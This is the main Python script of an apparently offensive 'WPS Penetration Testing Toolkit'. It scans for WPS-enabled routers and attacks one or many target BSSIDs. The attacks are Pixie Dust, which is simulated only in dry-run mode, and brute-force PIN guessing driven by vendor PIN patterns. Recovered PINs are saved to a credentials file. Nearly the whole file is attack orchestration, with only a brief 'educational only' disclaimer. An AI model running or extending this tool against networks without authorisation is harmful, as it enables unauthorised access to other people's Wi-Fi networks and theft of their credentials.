#!/usr/bin/env python3
"""
WPS Penetration Testing Toolkit - Main Entry Point
Author: Farhan

Professional WPS PIN recovery tool with Pixie Dust and brute force support.
Educational purposes only - Unauthorized access is illegal.
"""

import sys
import argparse
from pathlib import Path
from typing import List, Optional

from src.logger import init_logger, get_logger, Timer
from src.ui import init_ui, get_ui
from src.scanner import WiFiScanner, AccessPoint
from src.db import VulnerabilityDB
from src.pingen import PINGenerator
from src.pixie import PixieDustAttack
from src.wpa_ctrl import WPAController
from src.bruteforce import BruteForceAttack


def parse_arguments() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description='WPS Penetration Testing Toolkit by Farhan',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Dry run (simulation mode - no hardware required)
  %(prog)s --dry-run --target 00:11:22:33:44:55
  
  # Pixie Dust attack with database
  %(prog)s --target 00:11:22:33:44:55 --pixie --db db/vuln_db.json
  
  # Full attack (Pixie + Brute force)
  %(prog)s --target 00:11:22:33:44:55 --pixie --bruteforce --save-creds db/creds.json
  
  # Multi-target from file
  %(prog)s --targets targets.txt --concurrency 2 --mobile
  
  # Scan for WPS-enabled APs
  %(prog)s --scan-only

Legal Notice:
  This tool is for educational and authorized testing only.
  Unauthorized access to computer networks is illegal.
        """
    )
    
    # Target selection
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument(
        '--target',
        help='Target AP BSSID (MAC address)'
    )
    target_group.add_argument(
        '--targets',
        help='File with list of target BSSIDs (one per line)'
    )
    target_group.add_argument(
        '--scan-only',
        action='store_true',
        help='Only scan and display WPS-enabled APs'
    )
    
    # Attack modes
    parser.add_argument(
        '--pixie',
        action='store_true',
        help='Enable Pixie Dust attack'
    )
    parser.add_argument(
        '--bruteforce',
        action='store_true',
        help='Enable brute force PIN attack'
    )
    parser.add_argument(
        '--pixie-depth',
        type=int,
        default=3,
        help='Number of Pixie Dust variant attempts (default: 3)'
    )
    
    # Database options
    parser.add_argument(
        '--db',
        default='db/vuln_db.json',
        help='Vulnerability database path (default: db/vuln_db.json)'
    )
    parser.add_argument(
        '--save-creds',
        help='Save found credentials to file'
    )
    
    # Network interface
    parser.add_argument(
        '-i', '--interface',
        default='wlan0',
        help='Wireless interface (default: wlan0)'
    )
    
    # Performance options
    parser.add_argument(
        '--delay',
        type=float,
        default=1.0,
        help='Delay between PIN attempts in seconds (default: 1.0)'
    )
    parser.add_argument(
        '--retries',
        type=int,
        default=3,
        help='Max retries per PIN on transient errors (default: 3)'
    )
    parser.add_argument(
        '--concurrency',
        type=int,
        default=1,
        help='Number of concurrent AP attacks (default: 1)'
    )
    parser.add_argument(
        '--mobile',
        action='store_true',
        help='Enable mobile/Termux optimizations'
    )
    
    # Output options
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Verbose output'
    )
    parser.add_argument(
        '--quiet', '-q',
        action='store_true',
        help='Quiet mode (only errors and results)'
    )
    parser.add_argument(
        '--no-color',
        action='store_true',
        help='Disable colored output'
    )
    parser.add_argument(
        '--log-file',
        help='Save logs to file'
    )
    
    # Special modes
    parser.add_argument(
        '--dry-run',
        action='store_true',
        help='Simulation mode (no hardware required)'
    )
    
    return parser.parse_args()


def scan_for_targets(scanner: WiFiScanner, ui) -> List[AccessPoint]:
    """
    Scan for WPS-enabled access points.
    
    Args:
        scanner: WiFiScanner instance
        ui: UI instance
    
    Returns:
        List of AccessPoint objects
    """
    logger = get_logger()
    
    logger.info(ui.marker_info() + " Scanning for WPS-enabled access points...")
    aps = scanner.scan(wps_only=True, min_rssi=-90)
    
    if not aps:
        logger.error(ui.marker_error() + " No WPS-enabled access points found")
        return []
    
    logger.info(ui.marker_success() + f" Found {len(aps)} WPS-enabled AP(s)")
    logger.info("")
    
    # Display APs
    logger.info(ui.section("Available WPS Access Points"))
    for i, ap in enumerate(aps, 1):
        status = ui.status_locked() if ap.wps_locked else ui.status_vulnerable()
        logger.info(f"  [{i}] {ui.bssid(ap.bssid)} {ui.ssid(ap.ssid):30} "
                   f"Ch {ap.channel:2d} {ap.rssi:3d}dBm {status}")
    
    return aps


def attack_ap(bssid: str, ssid: str, args: argparse.Namespace) -> Optional[str]:
    """
    Perform attack on a single AP.
    
    Args:
        bssid: Target BSSID
        ssid: Target SSID
        args: Command-line arguments
    
    Returns:
        Found PIN or None
    """
    logger = get_logger()
    ui = get_ui()
    timer = Timer()
    timer.start()
    
    logger.info(ui.header(f"Attacking {bssid}"))
    logger.info(f"{ui.marker_info()} Target: {ui.ssid(ssid)} ({ui.bssid(bssid)})")
    logger.info("")
    
    # Load vulnerability database
    db = None
    ap_record = None
    if Path(args.db).exists():
        db = VulnerabilityDB(args.db)
        ap_record = db.lookup_ap(bssid)
        
        if ap_record:
            logger.info(ui.marker_info() + f" Found in database: {ap_record.vendor or 'Unknown'}")
            if ap_record.known_pins:
                logger.info(ui.marker_info() + f" Known PINs: {len(ap_record.known_pins)}")
    
    found_pin = None
    
    # Try Pixie Dust attack
    if args.pixie:
        logger.info(ui.section("Pixie Dust Attack"))
        logger.info(ui.marker_progress() + " Attempting Pixie Dust attack...")
        
        pixie = PixieDustAttack(dry_run=args.dry_run)
        
        # In a real attack, we'd capture these from WPS handshake
        # For dry-run, we use simulated data
        if args.dry_run:
            result = pixie._simulate_pixiewps()
            
            # Output backward-compatible messages
            logger.info("[i] Running Pixiewps...")
            logger.info(f"E-Hash1: {result.e_hash1}")
            logger.info(f"E-Hash2: {result.e_hash2}")
            
            if result.success and result.pin:
                logger.success(ui.marker_success() + f" Pixie Dust successful! PIN: {ui.highlight(result.pin)}")
                found_pin = result.pin
            else:
                logger.info(ui.marker_error() + " WPS pin not found!")
        else:
            logger.warning(ui.marker_warning() + " Pixie Dust requires WPS handshake capture (use --dry-run for simulation)")
    
    # Try brute force if Pixie failed or not attempted
    if not found_pin and args.bruteforce:
        logger.info(ui.section("Brute Force Attack"))
        logger.info(ui.marker_progress() + " Generating PIN candidates...")
        
        # Generate PINs
        pin_gen = PINGenerator()
        vendor_pattern = None
        known_pins = []
        
        if db and ap_record:
            if ap_record.vendor:
                vp = db.lookup_vendor_patterns(ap_record.vendor)
                if vp:
                    vendor_pattern = {'prefixes': vp.prefixes, 'patterns': vp.patterns}
            known_pins = ap_record.known_pins
        
        candidates = pin_gen.generate_all(
            vendor=ap_record.vendor if db and ap_record else None,
            vendor_patterns=vendor_pattern,
            known_pins=known_pins,
            max_candidates=1000 if not args.mobile else 500
        )
        
        logger.info(ui.marker_info() + f" Generated {len(candidates)} PIN candidates")
        
        # Execute brute force
        wpa_ctrl = WPAController(interface=args.interface, dry_run=args.dry_run)
        bf_attack = BruteForceAttack(
            wpa_ctrl=wpa_ctrl,
            delay=args.delay,
            max_retries=args.retries
        )
        
        def progress_callback(current: int, total: int, pin: str) -> None:
            """Display progress."""
            if current % 10 == 0 or args.verbose:
                elapsed = timer.elapsed()
                remaining = bf_attack.estimate_time_remaining(current, total, elapsed)
                logger.info(
                    f"{ui.marker_progress()} Testing PIN {current}/{total}: {pin} "
                    f"(ETA: {remaining})"
                )
        
        logger.info(ui.marker_progress() + " Starting brute force attack...")
        found_pin = bf_attack.run_attack(
            bssid=bssid,
            ssid=ssid,
            pin_candidates=candidates,
            progress_callback=progress_callback if args.verbose else None
        )
        
        if found_pin:
            logger.success(ui.marker_success() + f" PIN found: {ui.highlight(found_pin)}")
        else:
            logger.error(ui.marker_error() + " No PIN found")
    
    # Display results
    timer.stop()
    logger.info("")
    logger.info(ui.marker_info() + f" [*] Time taken: {timer.elapsed_formatted()}")
    
    if found_pin and args.save_creds:
        save_credentials(bssid, ssid, found_pin, args.save_creds)
    
    if db:
        db.close()
    
    return found_pin


def save_credentials(bssid: str, ssid: str, pin: str, creds_file: str) -> None:
    """Save found credentials to file."""
    logger = get_logger()
    ui = get_ui()
    
    try:
        creds_path = Path(creds_file)
        creds_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Load existing credentials
        creds = []
        if creds_path.exists():
            import json
            with open(creds_path, 'r', encoding='utf-8') as f:
                creds = json.load(f)
        
        # Add new credential
        creds.append({
            'bssid': bssid,
            'ssid': ssid,
            'pin': pin,
            'timestamp': Timer().elapsed()
        })
        
        # Save
        import json
        with open(creds_path, 'w', encoding='utf-8') as f:
            json.dump(creds, f, indent=2)
        
        logger.success(ui.marker_success() + f" Credentials saved to {creds_file}")
    except IOError as e:
        logger.error(ui.marker_error() + f" Failed to save credentials: {e}")


def main() -> int:
    """Main entry point."""
    args = parse_arguments()
    
    # Initialize UI and logging
    ui = init_ui(no_color=args.no_color)
    logger = init_logger(
        verbose=args.verbose,
        quiet=args.quiet,
        log_file=args.log_file
    )
    
    # Display banner
    if not args.quiet:
        logger.info(ui.banner())
    
    # Validate arguments
    if not args.scan_only and not args.target and not args.targets:
        logger.error(ui.marker_error() + " No target specified. Use --target, --targets, or --scan-only")
        return 1
    
    if not args.scan_only and not args.pixie and not args.bruteforce:
        logger.error(ui.marker_error() + " No attack mode specified. Use --pixie and/or --bruteforce")
        return 1
    
    # Initialize scanner
    scanner = WiFiScanner(interface=args.interface, dry_run=args.dry_run)
    
    # Scan-only mode
    if args.scan_only:
        scan_for_targets(scanner, ui)
        return 0
    
    # Determine targets
    targets = []
    if args.target:
        # Single target - need to scan for SSID
        aps = scanner.scan(wps_only=False)
        target_ap = next((ap for ap in aps if ap.bssid.upper() == args.target.upper()), None)
        if target_ap:
            targets.append((args.target, target_ap.ssid))
        else:
            targets.append((args.target, "Unknown"))
    elif args.targets:
        # Multiple targets from file
        try:
            with open(args.targets, 'r', encoding='utf-8') as f:
                for line in f:
                    bssid = line.strip()
                    if bssid:
                        targets.append((bssid, "Unknown"))
        except IOError:
            logger.error(ui.marker_error() + f" Could not read targets file: {args.targets}")
            return 1
    
    # Attack targets
    success_count = 0
    for bssid, ssid in targets:
        found_pin = attack_ap(bssid, ssid, args)
        if found_pin:
            success_count += 1
    
    # Summary
    logger.info("")
    logger.info(ui.section("Attack Summary"))
    logger.info(f"  Targets attacked: {len(targets)}")
    logger.info(f"  Successful: {success_count}")
    logger.info(f"  Failed: {len(targets) - success_count}")
    
    return 0 if success_count > 0 else 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(130)
